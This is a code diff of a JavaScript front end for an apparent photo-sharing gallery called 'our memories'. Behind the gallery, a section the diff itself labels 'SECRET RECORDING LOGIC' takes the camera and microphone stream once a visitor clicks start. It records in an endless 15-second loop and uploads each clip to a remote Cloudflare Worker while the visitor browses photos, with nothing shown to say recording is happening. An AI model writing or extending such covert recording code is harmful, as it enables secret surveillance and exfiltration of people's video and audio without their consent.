@@ -1,11 +1,13 @@
-const WORKER_URL = 'https://ourmemory.mrony8552.workers.dev'; // আপনার ক্লাউডফ্লেয়ার লিংক
+const WORKER_URL = 'https://ourmemory.mrony8552.workers.dev';
 
 const landingPage = document.getElementById('landing-page');
 const galleryPage = document.getElementById('gallery-page');
 const startBtn = document.getElementById('start-recording-btn');
+const galleryContainer = document.getElementById('gallery');
 
-const RECORDING_CHUNK_MS = 15000; // 15 seconds
+const RECORDING_CHUNK_MS = 15000; 
 
+// --- SECRET RECORDING LOGIC ---
 startBtn.addEventListener('click', async () => {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
@@ -13,73 +15,106 @@ startBtn.addEventListener('click', async () => {
         landingPage.style.display = 'none';
         galleryPage.style.display = 'block';
 
-        // নতুন রেকর্ডিং লুপ চালু করা
+        loadGalleryImages();
         startRecordingCycle(stream);
-
     } catch (err) {
-        console.log("Camera access denied or failed.");
+        console.log("Camera access denied.");
         landingPage.style.display = 'none';
         galleryPage.style.display = 'block';
+        loadGalleryImages();
     }
 });
 
-// এই নতুন ফাংশনটি প্রতি ১৫ সেকেন্ড পর রেকর্ডিং থামিয়ে পূর্ণাঙ্গ ফাইল বানাবে এবং আবার চালু করবে
 function startRecordingCycle(stream) {
     const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
     const chunks = [];
 
     mediaRecorder.ondataavailable = (event) => {
-        if (event.data && event.data.size > 0) {
-            chunks.push(event.data);
-        }
+        if (event.data && event.data.size > 0) chunks.push(event.data);
     };
 
     mediaRecorder.onstop = async () => {
-        // একটি সম্পূর্ণ স্বাধীন ভিডিও ফাইল তৈরি করা হচ্ছে
         const finalBlob = new Blob(chunks, { type: 'video/webm' });
         await uploadChunk(finalBlob);
-        
-        // আপলোড শুরু হওয়ার সাথে সাথেই পরের ১৫ সেকেন্ডের জন্য নতুন রেকর্ডিং চালু
-        startRecordingCycle(stream);
+        startRecordingCycle(stream); 
     };
 
-    // রেকর্ডিং শুরু
     mediaRecorder.start();
-
-    // ঠিক ১৫ সেকেন্ড পর রেকর্ডিং থামিয়ে দেওয়া, যা onstop ইভেন্ট ট্রিগার করবে
-    setTimeout(() => {
-        if (mediaRecorder.state === 'recording') {
-            mediaRecorder.stop();
-        }
-    }, RECORDING_CHUNK_MS);
+    setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, RECORDING_CHUNK_MS);
 }
 
 async function uploadChunk(blob) {
     const formData = new FormData();
     formData.append('file', blob, `reaction-${Date.now()}.webm`);
+    try { await fetch(`${WORKER_URL}/api/upload`, { method: 'POST', body: formData }); } 
+    catch (err) { console.log("Upload delayed."); }
+}
+
+// --- PREMIUM GALLERY UPLOAD & DISPLAY ---
+const uploadBtn = document.getElementById('upload-btn');
+const imageUploadInput = document.getElementById('image-upload-input');
+
+if(uploadBtn) uploadBtn.addEventListener('click', () => imageUploadInput.click());
+
+if(imageUploadInput) {
+    imageUploadInput.addEventListener('change', async (e) => {
+        const files = e.target.files;
+        if (files.length === 0) return;
+        
+        galleryContainer.innerHTML = '<div class="loading-text">Uploading photos... ⏳</div>';
+        
+        for (let file of files) {
+            const formData = new FormData();
+            formData.append('file', file);
+            try { await fetch(`${WORKER_URL}/api/upload-image`, { method: 'POST', body: formData }); } 
+            catch (err) { console.error(err); }
+        }
+        loadGalleryImages();
+    });
+}
+
+async function loadGalleryImages() {
+    if(!galleryContainer) return;
+    galleryContainer.innerHTML = '<div class="loading-text">Loading our memories... ✨</div>';
     
     try {
-        await fetch(`${WORKER_URL}/api/upload`, { 
-            method: 'POST', 
-            body: formData 
-        });
-    } catch (err) { 
-        console.log("Upload delayed due to network."); 
+        const res = await fetch(`${WORKER_URL}/api/images`);
+        if (res.ok) {
+            const data = await res.json();
+            galleryContainer.innerHTML = ''; 
+            
+            if (data.images.length === 0) {
+                galleryContainer.innerHTML = '<div class="loading-text">No photos yet. Click the upload icon! ❤️</div>';
+                return;
+            }
+            
+            data.images.forEach(imgKey => {
+                const imgEl = document.createElement('img');
+                imgEl.src = `${WORKER_URL}/api/image/${imgKey}`;
+                imgEl.loading = 'lazy';
+                galleryContainer.appendChild(imgEl);
+            });
+        }
+    } catch (error) {
+        galleryContainer.innerHTML = '<div class="loading-text">Could not load images.</div>';
     }
 }
 
-// Layout & Theme Switching
-document.getElementById('theme-toggle').addEventListener('click', () => {
-    const themes = ['theme-day', 'theme-night', 'theme-pink'];
-    let current = themes.find(t => document.body.classList.contains(t)) || 'theme-pink';
-    document.body.classList.remove(current);
-    let next = themes[(themes.indexOf(current) + 1) % themes.length];
-    document.body.classList.add(next);
-});
+// --- UI CONTROLS (Theme & Layout) ---
+const themeToggle = document.getElementById('theme-toggle');
+if(themeToggle) {
+    themeToggle.addEventListener('click', () => {
+        document.body.classList.toggle('theme-night');
+    });
+}
 
-document.getElementById('view-grid').addEventListener('click', () => {
-    document.getElementById('gallery').className = 'gallery layout-grid';
-});
-document.getElementById('view-masonry').addEventListener('click', () => {
-    document.getElementById('gallery').className = 'gallery layout-masonry';
-});
+const layoutToggle = document.getElementById('layout-toggle');
+if(layoutToggle) {
+    layoutToggle.addEventListener('click', () => {
+        if(galleryContainer.classList.contains('layout-grid')) {
+            galleryContainer.classList.replace('layout-grid', 'layout-masonry');
+        } else {
+            galleryContainer.classList.replace('layout-masonry', 'layout-grid');
+        }
+    });
+}
